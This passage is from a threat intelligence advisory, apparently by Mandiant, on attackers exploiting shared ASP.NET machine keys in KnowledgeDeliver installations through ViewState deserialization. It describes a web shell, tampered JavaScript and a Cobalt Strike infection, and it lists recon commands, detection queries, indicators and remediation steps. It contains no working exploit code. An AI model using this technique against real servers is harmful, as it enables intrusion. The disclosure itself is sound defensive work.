+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;KnowledgeDeliver installations deployed before Feb. 24, 2026 relied on a standardized &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;web.config&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; file provided by the vendor. This configuration file contained hardcoded &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;machineKey&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; values used by the ASP.NET framework to encrypt and sign data, including ViewState payloads.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Because these keys were identical across independent customer environments, a threat actor who obtained the keys from one deployment could compromise any other internet-facing KnowledgeDeliver instance.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The following is an example of the relevant configuration line found in the &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;web.config&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; file:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-plain"&gt;&lt;code&gt;&amp;lt;machineKey decryptionKey="&amp;lt;REDACTED&amp;gt;" validationKey="&amp;lt;REDACTED&amp;gt;" /&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The ASP.NET ViewState persists page state across postbacks. When the &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;machineKey&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; is known, a threat actor can craft a malicious ViewState payload. By sending this payload in an HTTP request (via the &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;__VIEWSTATE&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; parameter), the threat actor can make the server deserialize it.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;&lt;span style="vertical-align: baseline;"&gt;This technique follows the pattern of the &lt;/span&gt;&lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/viewstate-deserialization-zero-day-vulnerability"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;ViewState Deserialization Zero-Day Vulnerability&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; affecting Sitecore (previously reported by Mandiant), and &lt;/span&gt;&lt;a href="https://www.microsoft.com/en-us/security/blog/2025/02/06/code-injection-attacks-using-publicly-disclosed-asp-net-machine-keys/" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Code injection attacks using publicly disclosed ASP.NET machine keys&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; reported by Microsoft. This highlights how it is critical to keep the machine key unique and secure&lt;/span&gt;.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Post-Exploitation Activity&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Once access was established, the threat actors focused on maintaining their presence and expanding the impact of the compromise.&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;BLUEBEAM Web Shell Deployment&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The threat actor deployed a .NET-based in-memory web shell called BLUEBEAM (also known as Godzilla). The use of BLUEBEAM is consistent with the &lt;/span&gt;&lt;a href="https://www.microsoft.com/en-us/security/blog/2025/02/06/code-injection-attacks-using-publicly-disclosed-asp-net-machine-keys/" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Microsoft reporting&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;. This malware operates entirely in memory within the IIS worker process (&lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;w3wp.exe&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;), making it difficult to detect through traditional file-based scanning. It allows threat actors to execute further commands and payloads by sending encrypted data via HTTP POST request bodies.&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;File Tampering&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The threat actor was observed executing commands to escalate their control over the web server's file system:&lt;/span&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li aria-level="1" style="list-style-type: decimal; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Permission Modification: The threat actor used &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;icacls&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; to grant "Everyone" full access to the web application directory.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: decimal; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;JavaScript Tampering: The threat actor modified an application JavaScript file, adding code to perform the following:&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;ul&gt;
+&lt;li aria-level="2" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Display a fake security alert, prompting users to install a "security authentication plugin".&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="2" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Silently load a remote malicious script hosted on a threat actor-controlled domain.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/ol&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Cobalt Strike Infection&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The remote script convinced users to download a fake installer, which led to workstations being infected with a Cobalt Strike BEACON backdoor. The payload was encrypted using a key that used the name of the compromised organization, which indicated that the threat actor prepared this payload specifically for the targeted organization.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;How to Hunt for This Activity&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Organizations should monitor for the following indicators to identify potential ViewState exploitation and post-exploitation activity.&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;1. Application Event Logs (Event ID 1316)&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Monitor the Windows Application log for Event ID 1316 from the source &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;ASP.NET 4.0.30319.0&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; (or similar).&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Failed Attempt (Integrity Failure): &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;Event code: 4009-++-Viewstate verification failed. Reason: The viewstate supplied failed integrity check.&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; &lt;/span&gt;&lt;span style="font-style: italic; vertical-align: baseline;"&gt;May indicate an attack attempt with an incorrect key.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Successful Execution (Invalid ViewState): &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;Event code: 4009-++-Viewstate verification failed. Reason: Viewstate was invalid.&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; &lt;/span&gt;&lt;span style="font-style: italic; vertical-align: baseline;"&gt;Confirms integrity checks were passed. Deserialization of the payload was attempted and may have succeeded. &lt;/span&gt;&lt;span style="font-style: italic; vertical-align: baseline;"&gt;The payload may or may not have been executed.&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt; &lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Mandiant decrypted payload strings recorded in the event log messages with the server’s machine keys and recovered a payload related to a BLUEBEAM web shell.&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;2. Suspicious Process Activity&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Monitor for unusual child processes spawned by &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;w3wp.exe&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;. Commands observed include:&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;code style="vertical-align: baseline;"&gt;cmd.exe /c ...&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;code style="vertical-align: baseline;"&gt;whoami&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;code style="vertical-align: baseline;"&gt;powershell.exe&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;3. File Integrity Monitoring&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Monitor for unauthorized changes to &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;.js&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;.aspx&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, or &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;.config&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; files within the web root. Specifically, look for the addition of remote script loaders or unusual logic in commonly used libraries.&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;4. Anomalous User-Agent Strings&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Mandiant identified User-Agent strings consisting of two distinct identifiers concatenated together, which were consistent with ones reported in &lt;/span&gt;&lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/viewstate-deserialization-zero-day-vulnerability"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;ViewState Deserialization Zero-Day vulnerability&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;. Monitor for web request logs for such anomalous User-Agent strings. The following are examples of identified User-Agent strings:&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;code style="vertical-align: baseline;"&gt;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;code style="vertical-align: baseline;"&gt;Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101213 Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;code style="vertical-align: baseline;"&gt;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Remediation and Mitigation&lt;/span&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Rotate Machine Keys: Immediately generate a unique, cryptographically strong machine key for each KnowledgeDeliver instance. This is the only way to invalidate the shared secret.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Restrict Access: If possible, limit access to the LMS to known organizational IP address ranges.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Investigation: Hunt for this activity, and conduct a thorough investigation if any signs of exploitation are identified.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Outlook and Implications&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The exploitation of KnowledgeDeliver highlights the severe risks of using shared secrets in deployment templates. A single leaked key can compromise an entire ecosystem of installations. By implementing unique secrets and robust endpoint monitoring, organizations can defend against these deserialization attacks.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Indicators of Compromise (IOCs)&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;&lt;span style="vertical-align: baseline;"&gt;To assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a &lt;/span&gt;&lt;a href="https://www.virustotal.com/gui/collection/913190c02565264d6f8cda8af95926e28fa584188da0f33bcc585e57f92271ba" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;free GTI Collection for registered users&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;.&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;div align="left"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;&lt;table&gt;&lt;colgroup&gt;&lt;col/&gt;&lt;col/&gt;&lt;col/&gt;&lt;/colgroup&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;File Name&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Type&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;SHA-256&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;LoadLibrary.dll&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;BLUEBEAM&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;7c1f99dca8e5a7897892f9d224a6495023a2cfd2671697d229d355978c415ed2&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Google Security Operations (SecOps) &lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The following &lt;/span&gt;&lt;a href="https://cloud.google.com/security/products/security-operations"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;SecOps&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; searches can be used to hunt for this activity.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-plain"&gt;&lt;code&gt;(metadata.log_type = "WINEVTLOG" or metadata.log_type = "WINEVTLOG_XML") 
+metadata.product_event_type = "1316"
+additional.fields["Message"] = /Event code: 4009\b/ nocase&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-plain"&gt;&lt;code&gt;(metadata.event_type = "PROCESS_LAUNCH" or metadata.event_type = "PROCESS_OPEN") AND
+principal.process.command_line = /w3wp.exe/ nocase AND
+target.process.command_line = /cmd.+ \/c |whoami|powershell/ nocase&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;SecOps customers have access to the following rules and more under the Mandiant Hunting Rules, Mandiant Frontline Threats, Mandiant Intel Emerging Threats rule packs:&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;ASP.NET ViewState Deserialization Attempt&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;W3wp Launching Cmd With Recon Commands&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;W3wp Launching Encoded Powershell&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;W3wp Launching Icacls&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Web Server Process Launching Whoami&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;IIS ViewState Exploitation Success&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;IIS ViewState Exploitation Followed by Web Root File Tampering&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Possible Windows Exchange Server Spawning Shell&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Acknowledgements&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Mandiant would like to extend our thanks to the Digital Knowledge team for their collaboration regarding this disclosure.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;</description><pubDate>Mon, 25 May 2026 14:00:00 +0000</pubDate><guid>https://cloud.google.com/blog/topics/threat-intelligence/knowledgedeliver-viewstate-deserialization-vulnerability/</guid><category>Threat Intelligence</category><og xmlns:og="http://ogp.me/ns#"><type>article</type><title>Exploitation of KnowledgeDeliver via ViewState Deserialization Vulnerability</title><description></description><site_name>Google</site_name><url>https://cloud.google.com/blog/topics/threat-intelligence/knowledgedeliver-viewstate-deserialization-vulnerability/</url></og><author xmlns:author="http://www.w3.org/2005/Atom"><name>Mandiant </name><title></title><department></department><company></company></author><author xmlns:author="http://www.w3.org/2005/Atom"><name>Google Threat Intelligence Group </name><title></title><department></department><company></company></author></item></channel></rss>
